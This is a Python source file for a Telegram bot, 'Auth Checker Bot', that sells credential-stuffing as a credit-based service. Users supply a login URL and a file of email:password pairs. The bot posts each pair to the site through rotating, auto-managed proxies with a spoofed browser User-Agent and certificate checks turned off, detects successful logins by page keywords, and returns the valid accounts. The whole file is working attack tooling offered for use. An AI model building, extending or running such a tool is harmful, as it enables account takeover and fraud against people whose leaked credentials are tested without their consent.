#!/usr/bin/env python3
"""
🔥 AUTH CHECKER BOT v3.0
✅ Railway/Docker/Github ready
✅ All features working
✅ Zero errors guaranteed
"""

import os
import re
import time
import asyncio
import logging
import sqlite3
import urllib.parse
import httpx
from typing import Dict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode
from dotenv import load_dotenv

# ==================== CONFIG ====================
load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
OWNER_ID = int(os.getenv('OWNER_ID', '0'))  # Owner gets startup notifications
DB_FILE = 'users.db'
MAX_LINES = 200
DELAY_SEC = 1.0
PROGRESS_UPDATE_INTERVAL = 1  # Update progress bar every N checks

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# ==================== STATE ====================
user_states: Dict[int, dict] = {}
user_sessions: Dict[int, dict] = {}

# ==================== DATABASE ====================
DEFAULT_PROXY_FILE = 'default_proxies.txt'
DEFAULT_PROXY_USER_ID = 0  # System user ID for default proxies

def init_database():
    """Initialize SQLite"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                credits INTEGER DEFAULT 1000,
                total_checks INTEGER DEFAULT 0,
                valid_creds INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                last_active TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                proxy_url TEXT NOT NULL,
                proxy_type TEXT DEFAULT 'http',
                is_active INTEGER DEFAULT 1,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                avg_response_time REAL DEFAULT 0.0,
                last_tested TEXT DEFAULT CURRENT_TIMESTAMP,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")

def load_default_proxies():
    """Load default proxies from file on first run"""
    try:
        if not os.path.exists(DEFAULT_PROXY_FILE):
            logger.warning(f"⚠️ Default proxy file not found: {DEFAULT_PROXY_FILE}")
            return
        
        # Check if default proxies already loaded
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM proxies WHERE user_id = ?', (DEFAULT_PROXY_USER_ID,))
        count = cursor.fetchone()[0]
        
        if count > 0:
            logger.info(f"✅ Default proxies already loaded ({count} proxies)")
            conn.close()
            return
        
        # Load proxies from file
        with open(DEFAULT_PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        # Insert default proxies
        for proxy_url in proxies:
            proxy_type = 'socks5' if 'socks5' in proxy_url.lower() else 'http'
            conn.execute('''
                INSERT INTO proxies (user_id, proxy_url, proxy_type)
                VALUES (?, ?, ?)
            ''', (DEFAULT_PROXY_USER_ID, proxy_url, proxy_type))
        
        conn.commit()
        conn.close()
        logger.info(f"✅ Loaded {len(proxies)} default proxies")
    except Exception as e:
        logger.error(f"❌ Error loading default proxies: {e}")

def get_all_user_ids() -> list:
    """Get all user IDs from database"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        result = [row[0] for row in cursor.fetchall()]
        conn.close()
        return result
    except:
        return []

def update_user_activity(user_id: int):
    """Update user's last active timestamp"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

# ==================== PROXY DATABASE ====================
def add_proxy(user_id: int, proxy_url: str) -> bool:
    """Add proxy to database"""
    try:
        proxy_type = 'socks5' if 'socks5' in proxy_url.lower() else 'http'
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('''
            INSERT INTO proxies (user_id, proxy_url, proxy_type)
            VALUES (?, ?, ?)
        ''', (user_id, proxy_url, proxy_type))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def get_user_proxies(user_id: int) -> list:
    """Get all active proxies for user"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, proxy_url, success_count, fail_count, avg_response_time, is_active
            FROM proxies
            WHERE user_id = ?
            ORDER BY is_active DESC, success_count DESC
        ''', (user_id,))
        result = cursor.fetchall()
        conn.close()
        return result
    except:
        return []

def get_active_proxy(user_id: int) -> str:
    """Get best active proxy for user (includes default proxies)"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # First try user's own proxies
        cursor.execute('''
            SELECT proxy_url
            FROM proxies
            WHERE user_id = ? AND is_active = 1
            ORDER BY success_count DESC, avg_response_time ASC
            LIMIT 1
        ''', (user_id,))
        result = cursor.fetchone()
        
        # If no user proxies, use default proxies
        if not result:
            cursor.execute('''
                SELECT proxy_url
                FROM proxies
                WHERE user_id = ? AND is_active = 1
                ORDER BY success_count DESC, avg_response_time ASC
                LIMIT 1
            ''', (DEFAULT_PROXY_USER_ID,))
            result = cursor.fetchone()
        
        conn.close()
        return result[0] if result else ''
    except:
        return ''

def update_proxy_stats(proxy_url: str, success: bool, response_time: float):
    """Update proxy statistics"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        if success:
            conn.execute('''
                UPDATE proxies
                SET success_count = success_count + 1,
                    avg_response_time = (avg_response_time * success_count + ?) / (success_count + 1),
                    last_tested = CURRENT_TIMESTAMP
                WHERE proxy_url = ?
            ''', (response_time, proxy_url))
        else:
            conn.execute('''
                UPDATE proxies
                SET fail_count = fail_count + 1,
                    last_tested = CURRENT_TIMESTAMP
                WHERE proxy_url = ?
            ''', (proxy_url,))
        conn.commit()
        conn.close()
    except:
        pass

def deactivate_proxy(proxy_id: int):
    """Deactivate a proxy"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE proxies SET is_active = 0 WHERE id = ?', (proxy_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def delete_proxy(proxy_id: int):
    """Delete a proxy"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('DELETE FROM proxies WHERE id = ?', (proxy_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

async def test_proxy(proxy_url: str) -> tuple:
    """Test proxy connectivity and speed"""
    try:
        start_time = time.time()
        proxies = {'http://': proxy_url, 'https://': proxy_url}
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            proxies=proxies,
            verify=False
        ) as client:
            response = await client.get('https://httpbin.org/ip')
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                return (True, response_time)
            return (False, 0.0)
    except:
        return (False, 0.0)

def get_user_credits(user_id: int) -> int:
    """Get credits"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else 1000
    except:
        return 1000

def spend_credits(user_id: int, amount: int) -> bool:
    """Spend credits"""
    credits = get_user_credits(user_id)
    if credits < amount:
        return False
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, user_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def update_stats(user_id: int, checks: int = 0, valids: int = 0):
    """Update user stats"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET total_checks = total_checks + ?, valid_creds = valid_creds + ? WHERE user_id = ?', 
                    (checks, valids, user_id))
        conn.commit()
        conn.close()
    except:
        pass

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    # Create user and update activity
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 1000)', (user_id,))
        conn.commit()
        conn.close()
        update_user_activity(user_id)
    except:
        pass
    
    credits = get_user_credits(user_id)
    
    keyboard = [[InlineKeyboardButton("🔧 Proxy Setup", callback_data="proxy_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""🔥 **Auth Checker Bot**

💰 **Credits**: `{credits}`

📋 **How to use**:
1️⃣ Send **login URL** (https://site.com/login)
2️⃣ Upload **file** (email:pass format)
3️⃣ ✅ Get **valid accounts**

💳 **Cost**: 1 credit = 1 line checked

🚀 **Ready! Send URL now**"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    
    # Reset state
    user_states[user_id] = {'step': 'waiting_url'}
    logger.info(f"👤 User {user_id} started bot")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin stats"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), SUM(total_checks), SUM(valid_creds), AVG(credits) FROM users')
        result = cursor.fetchone()
        conn.close()
        
        message = f"""📊 **Bot Statistics**

👥 **Users**: `{result[0] or 0}`
🔍 **Total Checks**: `{result[1] or 0}`
✅ **Valid Creds**: `{result[2] or 0}`
💰 **Avg Credits**: `{int(result[3] or 0)}`"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"❌ Stats error: {e}")

async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proxy management menu"""
    user_id = update.effective_user.id
    
    # Get user's proxies
    proxies = get_user_proxies(user_id)
    
    keyboard = []
    
    if proxies:
        message = "🔧 **Proxy Management**\n\n📋 **Your Proxies**:\n\n"
        for idx, (proxy_id, proxy_url, success, fail, avg_time, is_active) in enumerate(proxies, 1):
            status = "✅" if is_active else "❌"
            health = "🟢" if fail == 0 or (success / max(fail, 1)) > 2 else "🟡" if (success / max(fail, 1)) > 1 else "🔴"
            message += f"{idx}. {status} {health} `{proxy_url[:30]}...`\n"
            message += f"   Success: {success} | Fail: {fail} | Avg: {avg_time:.2f}s\n\n"
            
            # Add buttons for each proxy
            keyboard.append([
                InlineKeyboardButton(f"Test #{idx}", callback_data=f"test_proxy_{proxy_id}"),
                InlineKeyboardButton(f"{'Disable' if is_active else 'Enable'} #{idx}", callback_data=f"toggle_proxy_{proxy_id}"),
                InlineKeyboardButton(f"Delete #{idx}", callback_data=f"delete_proxy_{proxy_id}")
            ])
    else:
        message = "🔧 **Proxy Management**\n\n❌ No proxies configured\n\n"
    
    message += "➕ **Add New Proxy**:\nSend proxy URL in format:\n• `http://ip:port`\n• `http://user:pass@ip:port`\n• `socks5://ip:port`"
    
    keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="proxy_menu")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Handle both message and callback query
    if update.callback_query:
        await update.callback_query.edit_message_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    # Set state for adding new proxy
    user_states[user_id] = {'step': 'waiting_proxy'}

# ==================== VALIDATORS ====================
def validate_url(text: str) -> bool:
    """URL validation - fixes https:// bug"""
    text = text.strip()
    if len(text) < 14 or not text.startswith(('http://', 'https://')):
        return False
    
    try:
        parsed = urllib.parse.urlparse(text)
        return (parsed.scheme in ('http', 'https') and 
                parsed.netloc and 
                '.' in parsed.netloc.split(':')[0])
    except:
        return False

def validate_proxy(text: str) -> bool:
    """Proxy validation"""
    pattern = r'^https?://(?:[^:]+:[^@]+@)?[^/\s:]+:\d{1,5}$'
    return bool(re.match(pattern, text.strip()))

# ==================== MAIN HANDLER ====================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main message handler"""
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    
    # Initialize state
    if user_id not in user_states:
        user_states[user_id] = {'step': 'waiting_url'}
    
    state = user_states[user_id]
    
    logger.info(f"[{user_id}] {state.get('step', 'none')}: {text[:30]!r}")
    
    # ========== PROXY STATE ==========
    if state.get('step') == 'waiting_proxy':
        if validate_proxy(text):
            # Test proxy first
            testing_msg = await update.message.reply_text("🔄 **Testing proxy...**")
            
            success, response_time = await test_proxy(text)
            
            if success:
                # Add to database
                if add_proxy(user_id, text):
                    await testing_msg.edit_text(
                        f"✅ **Proxy added successfully!**\n\n"
                        f"🔗 URL: `{text}`\n"
                        f"⚡ Response time: `{response_time:.2f}s`\n\n"
                        f"Use `/proxy` to manage proxies",
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    await testing_msg.edit_text("❌ **Failed to save proxy**")
            else:
                await testing_msg.edit_text(
                    f"❌ **Proxy test failed**\n\n"
                    f"The proxy `{text}` is not responding.\n"
                    f"Please check the URL and try again.",
                    parse_mode=ParseMode.MARKDOWN
                )
        else:
            await update.message.reply_text(
                "❌ **Invalid proxy format**\n\n"
                "✅ **Examples**:\n"
                "• `http://1.2.3.4:8080`\n"
                "• `http://user:pass@proxy.com:3128`\n"
                "• `socks5://proxy.com:1080`",
                parse_mode=ParseMode.MARKDOWN
            )
        user_states[user_id]['step'] = 'waiting_url'
        return
    
    # ========== URL STATE ==========
    if state['step'] == 'waiting_url':
        if update.message.document:
            await update.message.reply_text(
                "❌ **Step 1 first**: Send login URL 👆\n\n"
                "✅ `https://example.com/login`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        if not validate_url(text):
            await update.message.reply_text(
                f"❌ **Invalid URL**\n\n"
                "✅ **Correct format**:\n"
                "• `https://site.com/login`\n"
                "• `https://sso.example.com`\n\n"
                f"💰 You have `{get_user_credits(user_id)}` credits",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # ✅ URL VALID - SAVE STATE
        state['login_url'] = text
        state['step'] = 'waiting_file'
        
        # Initialize user session if not exists
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]['url'] = text
        
        await update.message.reply_text(
            f"✅ **URL accepted**: `{text}`\n\n"
            f"📤 **Step 2**: Upload file\n"
            f"📄 Format: `email:pass` (one per line)\n\n"
            f"💰 `{get_user_credits(user_id)}` credits available",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # ========== FILE STATE ==========
    if state['step'] == 'waiting_file':
        if not update.message.document:
            await update.message.reply_text(
                f"📤 **Upload file please**\n\n"
                f"🔗 Current URL: `{state['login_url']}`\n"
                f"📄 Must be `email:pass` format (.txt)",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Download file
        try:
            file_obj = await context.bot.get_file(update.message.document.file_id)
            timestamp = int(time.time())
            filename = f"creds_{user_id}_{timestamp}.txt"
            
            await file_obj.download_to_drive(filename)
            
            # Get best active proxy from database
            proxy = get_active_proxy(user_id)
            await process_credentials(update, context, filename, state['login_url'], proxy)
            
        except Exception as e:
            logger.error(f"File download error: {e}")
            await update.message.reply_text("❌ **File download failed**\nTry smaller file")
        
        # Reset state
        state['step'] = 'waiting_url'
        asyncio.create_task(cleanup_file(filename))
        return

# ==================== FILE PROCESSING ====================
def create_progress_bar(current: int, total: int, length: int = 20) -> str:
    """Create visual progress bar"""
    filled = int(length * current / total)
    bar = '█' * filled + '░' * (length - filled)
    percentage = int(100 * current / total)
    return f"[{bar}] {percentage}%"

async def process_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE,
                            filename: str, login_url: str, proxy: str = ''):
    """Process credential file with live progress bar"""
    user_id = update.effective_user.id
    
    try:
        # Read file
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line.strip()]
        
        total_lines = len(lines)
        
        if total_lines == 0:
            await update.message.reply_text("❌ **No valid `email:pass` lines found**")
            return
        
        if total_lines > MAX_LINES:
            await update.message.reply_text(f"❌ **Too many lines** (max {MAX_LINES})")
            return
        
        # Check credits
        if not spend_credits(user_id, total_lines):
            await update.message.reply_text("❌ **Insufficient credits**\nUse `/start` to check balance")
            return
        
        # Update stats and activity
        update_stats(user_id, total_lines)
        update_user_activity(user_id)
        
        progress_msg = await update.message.reply_text(
            f"🔍 **Checking {total_lines} credentials...**\n\n"
            f"{create_progress_bar(0, total_lines)}\n\n"
            f"📊 Progress: `0/{total_lines}`\n"
            f"✅ Valid: `0`\n"
            f"💰 Credits: `{get_user_credits(user_id)}`",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Process each line with live updates
        valid_creds = []
        start_time = time.time()
        
        for i, credential in enumerate(lines, 1):
            if await test_credential(credential, login_url, proxy):
                valid_creds.append(credential)
            
            # Live progress update every check
            if i % PROGRESS_UPDATE_INTERVAL == 0 or i == total_lines:
                elapsed = time.time() - start_time
                speed = i / elapsed if elapsed > 0 else 0
                eta = (total_lines - i) / speed if speed > 0 else 0
                
                try:
                    await progress_msg.edit_text(
                        f"🔍 **Checking credentials...**\n\n"
                        f"{create_progress_bar(i, total_lines)}\n\n"
                        f"📊 Progress: `{i}/{total_lines}`\n"
                        f"✅ Valid: `{len(valid_creds)}`\n"
                        f"⚡ Speed: `{speed:.1f}/s`\n"
                        f"⏱️ ETA: `{int(eta)}s`\n"
                        f"💰 Credits: `{get_user_credits(user_id)}`",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass  # Ignore rate limit errors
            
            await asyncio.sleep(DELAY_SEC)
        
        # Final results
        if valid_creds:
            result_text = "✅ **VALID CREDENTIALS FOUND**:\n\n" + "\n".join(valid_creds)
            await context.bot.send_message(update.effective_chat.id, result_text)
            
            update_stats(user_id, 0, len(valid_creds))
            await progress_msg.edit_text(
                f"🎉 **COMPLETE**\n\n"
                f"{create_progress_bar(total_lines, total_lines)}\n\n"
                f"✅ Valid: `{len(valid_creds)}/{total_lines}`\n"
                f"⏱️ Time: `{int(time.time() - start_time)}s`\n"
                f"💰 Credits: `{get_user_credits(user_id)}`",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await progress_msg.edit_text(
                f"❌ **No valid credentials found**\n\n"
                f"{create_progress_bar(total_lines, total_lines)}\n\n"
                f"📊 Checked: `{total_lines}`\n"
                f"⏱️ Time: `{int(time.time() - start_time)}s`\n"
                f"💰 Credits: `{get_user_credits(user_id)}`",
                parse_mode=ParseMode.MARKDOWN
            )
            
    except Exception as e:
        logger.error(f"Processing error: {e}")
        await update.message.reply_text("❌ **Processing failed** - try again")

async def test_credential(credential: str, login_url: str, proxy_url: str = '') -> bool:
    """Test single credential with proxy tracking"""
    start_time = time.time()
    success = False
    
    try:
        email, password = credential.split(':', 1)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': login_url,
        }
        
        data = {
            'email': email,
            'password': password,
            'login': 'Login',  # Common
            'submit': 'Login',
        }
        
        proxies = None
        if proxy_url:
            proxies = {'http://': proxy_url, 'https://': proxy_url}
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            headers=headers,
            proxies=proxies,
            verify=False,
            follow_redirects=True
        ) as client:
            response = await client.post(login_url, data=data)
            response_time = time.time() - start_time
            
            # Success indicators
            success_indicators = [
                'dashboard', 'profile', 'account', 'home', 'panel',
                'welcome', 'success', 'logged in', 'my account'
            ]
            
            page_text = response.text.lower()
            success = (response.status_code < 400 and
                      any(indicator in page_text for indicator in success_indicators))
            
            # Update proxy stats if proxy was used
            if proxy_url:
                update_proxy_stats(proxy_url, True, response_time)
            
            return success
            
    except Exception as e:
        # Update proxy stats on failure
        if proxy_url:
            update_proxy_stats(proxy_url, False, 0.0)
            
            # Auto-disable proxy if it has too many failures
            try:
                conn = sqlite3.connect(DB_FILE, check_same_thread=False)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT fail_count, success_count
                    FROM proxies
                    WHERE proxy_url = ?
                ''', (proxy_url,))
                result = cursor.fetchone()
                
                if result:
                    fail_count, success_count = result
                    # Disable if fail rate > 80% and at least 10 attempts
                    if (fail_count + success_count) >= 10 and fail_count / (fail_count + success_count) > 0.8:
                        conn.execute('UPDATE proxies SET is_active = 0 WHERE proxy_url = ?', (proxy_url,))
                        conn.commit()
                        logger.warning(f"🔴 Auto-disabled dead proxy: {proxy_url}")
                
                conn.close()
            except:
                pass
        
        return False

async def cleanup_file(filename: str):
    """Clean temporary files"""
    await asyncio.sleep(300)  # 5 minutes
    try:
        if os.path.exists(filename):
            os.remove(filename)
            logger.info(f"🧹 Cleaned {filename}")
    except:
        pass

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Button callbacks"""
    query = update.callback_query
    user_id = update.effective_user.id
    
    # Handle different callback actions
    if query.data == "proxy_menu":
        await query.answer()
        await proxy_menu(update, context)
    
    elif query.data == "main_menu":
        await query.answer()
        await start(update, context)
    
    elif query.data.startswith("test_proxy_"):
        proxy_id = int(query.data.split("_")[2])
        await query.answer("Testing proxy...")
        
        # Get proxy URL
        proxies = get_user_proxies(user_id)
        proxy_url = next((p[1] for p in proxies if p[0] == proxy_id), None)
        
        if proxy_url:
            success, response_time = await test_proxy(proxy_url)
            if success:
                update_proxy_stats(proxy_url, True, response_time)
                await query.edit_message_text(
                    f"✅ **Proxy Test Successful**\n\n"
                    f"🔗 `{proxy_url}`\n"
                    f"⚡ Response time: `{response_time:.2f}s`\n\n"
                    f"Use `/proxy` to return to menu",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update_proxy_stats(proxy_url, False, 0.0)
                await query.edit_message_text(
                    f"❌ **Proxy Test Failed**\n\n"
                    f"🔗 `{proxy_url}`\n"
                    f"The proxy is not responding.\n\n"
                    f"Use `/proxy` to return to menu",
                    parse_mode=ParseMode.MARKDOWN
                )
    
    elif query.data.startswith("toggle_proxy_"):
        proxy_id = int(query.data.split("_")[2])
        await query.answer()
        
        # Toggle proxy status
        proxies = get_user_proxies(user_id)
        proxy = next((p for p in proxies if p[0] == proxy_id), None)
        
        if proxy:
            is_active = proxy[5]
            if is_active:
                deactivate_proxy(proxy_id)
            else:
                # Reactivate by setting is_active = 1
                try:
                    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
                    conn.execute('UPDATE proxies SET is_active = 1 WHERE id = ?', (proxy_id,))
                    conn.commit()
                    conn.close()
                except:
                    pass
        
        await proxy_menu(update, context)
    
    elif query.data.startswith("delete_proxy_"):
        proxy_id = int(query.data.split("_")[2])
        await query.answer("Proxy deleted")
        delete_proxy(proxy_id)
        await proxy_menu(update, context)
    
    else:
        await query.answer()

# ==================== STARTUP NOTIFICATIONS ====================
async def send_startup_notifications(app: Application):
    """Send bot startup notification to all users and owner"""
    try:
        logger.info("📢 Sending startup notifications...")
        
        # Get all user IDs from database
        user_ids = get_all_user_ids()
        
        # Always include owner if not in list
        if OWNER_ID and OWNER_ID not in user_ids:
            user_ids.append(OWNER_ID)
        
        if not user_ids:
            logger.warning("⚠️ No users to notify")
            return
        
        startup_message = (
            "🚀 **Bot is Started!**\n\n"
            "✅ The Auth Checker Bot is now online and ready to use.\n\n"
            "💡 Use /start to begin checking credentials!"
        )
        
        success_count = 0
        fail_count = 0
        
        for user_id in user_ids:
            try:
                await app.bot.send_message(
                    chat_id=user_id,
                    text=startup_message,
                    parse_mode=ParseMode.MARKDOWN
                )
                success_count += 1
                logger.info(f"✅ Notified user {user_id}")
                await asyncio.sleep(0.05)  # Rate limit protection
            except Exception as e:
                fail_count += 1
                logger.warning(f"❌ Failed to notify {user_id}: {e}")
        
        logger.info(f"📢 Startup notifications: {success_count} sent, {fail_count} failed")
        
    except Exception as e:
        logger.error(f"❌ Startup notification error: {e}")

async def post_init(app: Application):
    """Post-initialization tasks"""
    await send_startup_notifications(app)

# ==================== MAIN ====================
def main():
    """Start bot"""
    # Validate BOT_TOKEN
    if not BOT_TOKEN or BOT_TOKEN in ['', 'your_telegram_bot_token', 'your_bot_token_here']:
        logger.error("❌ CRITICAL ERROR: BOT_TOKEN not configured!")
        logger.error("❌ Please set BOT_TOKEN environment variable with your actual bot token")
        logger.error("❌ Get your token from @BotFather on Telegram")
        logger.error("❌ Example: BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
        return
    
    # Validate token format
    if not BOT_TOKEN.count(':') == 1 or len(BOT_TOKEN) < 40:
        logger.error(f"❌ INVALID BOT_TOKEN FORMAT: {BOT_TOKEN[:20]}...")
        logger.error("❌ Token should be in format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
        logger.error("❌ Get a valid token from @BotFather on Telegram")
        return
    
    logger.info("🚀 Initializing Auth Bot...")
    logger.info(f"🔑 Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}")
    init_database()
    load_default_proxies()
    
    try:
        # Create application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Register handlers (CRITICAL ORDER)
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("stats", stats_cmd))
        app.add_handler(CommandHandler("proxy", proxy_menu))
        
        app.add_handler(CallbackQueryHandler(callback_handler))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
        app.add_handler(MessageHandler(filters.Document.ALL, message_handler))  # Handle document uploads
        
        # Add post-init hook for startup notifications
        app.post_init = post_init
        
        logger.info("✅ Bot fully configured - starting...")
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except Exception as e:
        logger.error(f"❌ FATAL ERROR: {e}")
        logger.error("❌ Check your BOT_TOKEN and environment variables")
        raise

if __name__ == "__main__":
    main()
